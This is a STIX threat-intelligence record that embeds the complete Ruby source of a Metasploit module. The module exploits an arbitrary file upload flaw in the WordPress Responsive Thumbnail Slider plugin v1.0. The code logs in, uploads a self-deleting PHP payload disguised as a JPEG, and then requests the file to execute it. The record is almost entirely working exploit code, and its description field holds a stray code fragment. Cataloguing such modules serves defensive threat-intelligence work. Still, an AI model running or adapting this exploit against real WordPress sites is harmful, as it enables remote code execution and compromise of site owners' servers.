{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--20a4bd06-f36d-41dc-affc-ccb1f197590a",
    "created": "2024-08-14T17:08:21.468737Z",
    "modified": "2024-08-14T17:08:21.468741Z",
    "name": "\"WordPress Responsive Thumbnail Slider Arbitrary File Upload\"",
    "description": " This module exploits an arbitrary file upload vulnerability in Responsive Thumbnail Slider Plugin v1.0 for WordPress post authentication.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_responsive_thumbnail_slider_upload.rb",
            "external_id": "wp_responsive_thumbnail_slider_upload.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"WordPress Responsive Thumbnail Slider Arbitrary File Upload\",\n      'Description'    => %q{\n        This module exploits an arbitrary file upload vulnerability in Responsive Thumbnail Slider\n        Plugin v1.0 for WordPress post authentication.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Arash Khazaei', # EDB PoC\n          'Shelby Pace'    # Metasploit Module\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '37998' ]\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Responsive Thumbnail Slider Plugin v1.0', { } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-08-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base path for WordPress\", '/' ]),\n        OptString.new('WPUSERNAME', [ true, \"WordPress Username to authenticate with\", 'admin' ]),\n        OptString.new('WPPASSWORD', [ true, \"WordPress Password to authenticate with\", '' ])\n      ])\n  end\n\n  def check\n    # The version regex found in extract_and_check_version does not work for this plugin's\n    # readme.txt, so we build a custom one.\n    check_code = check_version || check_plugin_path\n    if check_code\n      return check_code\n    else\n      return CheckCode::Safe\n    end\n  end\n\n  def check_version\n    plugin_uri = normalize_uri(target_uri.path, '/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt')\n\n    res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  plugin_uri\n    )\n\n    if res && res.body && res.body =~ /Version:([\\d\\.]+)/\n      version = Rex::Version.new($1)\n      if version <= Rex::Version.new('1.0')\n        vprint_status(\"Plugin version found: #{version}\")\n        return CheckCode::Appears\n      end\n    end\n\n    nil\n  end\n\n  def check_plugin_path\n    plugin_uri = normalize_uri(target_uri.path, '/wp-content/uploads/wp-responsive-images-thumbnail-slider/')\n\n    res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  plugin_uri\n    )\n\n    if res && res.code == 200\n      vprint_status('Upload folder for wp-responsive-images-thumbnail-slider detected')\n      return CheckCode::Detected\n    end\n\n    nil\n  end\n\n  def login\n    auth_cookies = wordpress_login(datastore['WPUSERNAME'], datastore['WPPASSWORD'])\n    return fail_with(Failure::NoAccess, \"Unable to log into WordPress\") unless auth_cookies\n\n    store_valid_credential(user: datastore['WPUSERNAME'], private: datastore['WPPASSWORD'], proof: auth_cookies)\n\n    print_good(\"Logged into WordPress with #{datastore['WPUSERNAME']}:#{datastore['WPPASSWORD']}\")\n    auth_cookies\n  end\n\n  def upload_payload(cookies)\n    manage_uri = 'wp-admin/admin.php?page=responsive_thumbnail_slider_image_management'\n    file_payload = get_write_exec_payload(:unlink_self => true)\n    file_name = \"#{rand_text_alpha(5)}.php\"\n\n    # attempt to access plugins page\n    plugin_res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  normalize_uri(target_uri.path, manage_uri),\n      'cookie'  =>  cookies\n    )\n\n    unless plugin_res && plugin_res.body.include?(\"tmpl-uploader-window\")\n      fail_with(Failure::NoAccess, \"Unable to reach Responsive Thumbnail Slider Plugin Page\")\n    end\n\n    data = Rex::MIME::Message.new\n    data.add_part(file_payload, 'image/jpeg', nil, \"form-data; name=\\\"image_name\\\"; filename=\\\"#{file_name}\\\"\")\n    data.add_part(file_name.split('.')[0], nil, nil, \"form-data; name=\\\"imagetitle\\\"\")\n    data.add_part('Save Changes', nil, nil, \"form-data; name=\\\"btnsave\\\"\")\n    post_data = data.to_s\n\n    # upload the file\n    upload_res = send_request_cgi(\n      'method'  =>  'POST',\n      'uri'     =>  normalize_uri(target_uri.path, manage_uri, '&action=addedit'),\n      'cookie'  =>  cookies,\n      'ctype'   =>  \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    =>  post_data\n    )\n\n    page = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, manage_uri), 'cookie' => cookies)\n    fail_with(Failure::Unknown, \"Unsure of successful upload\") unless (upload_res && page && page.body =~ /New\\s+image\\s+added\\s+successfully/)\n\n    retrieve_file(page, cookies)\n  end\n\n  def retrieve_file(res, cookies)\n    fname = res.body.scan(/slider\\/(.*\\.php)/).flatten[0]\n    fail_with(Failure::BadConfig, \"Couldn't find file name\") if fname.empty? || fname.nil?\n    file_uri = normalize_uri(target_uri.path, \"wp-content/uploads/wp-responsive-images-thumbnail-slider/#{fname}\")\n\n    print_good(\"Successful upload\")\n    send_request_cgi(\n      'uri' => file_uri,\n      'method' => 'GET',\n      'cookie' => cookies\n    )\n  end\n\n  def exploit\n   unless check == CheckCode::Safe\n     auth_cookies = login\n     upload_payload(auth_cookies)\n   end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-28",
    "x_mitre_platforms": [
        "php'"
    ]
}